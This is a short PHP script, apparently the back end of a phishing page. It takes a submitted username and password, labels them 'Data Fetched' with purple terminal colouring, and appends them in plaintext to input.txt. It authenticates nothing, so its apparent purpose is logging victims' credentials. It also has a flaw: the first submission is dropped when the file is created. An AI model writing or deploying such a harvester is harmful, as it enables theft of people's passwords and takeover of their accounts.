    <?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $user_name = $_POST["user_name"];
      $user_pass = $_POST["password"];

      // Concatenate user data properly
      $data = "Data Fetched \n";
      $data .= "\033[35mUsername: $user_name\n\033[0m"; // Purple username
      $data .= "\033[35mPassword: $user_pass\n\033[0m"; // Purple password
      $data .= "-------------------------------------\n";
      // Write the data to input.txt
      $input_file = "input.txt";
      if (!file_exists($input_file)) {
        touch("input.txt");
      } else {
        file_put_contents("input.txt", $data, FILE_APPEND);
      }

      echo "<p>Saved to input.txt</p>";
    }
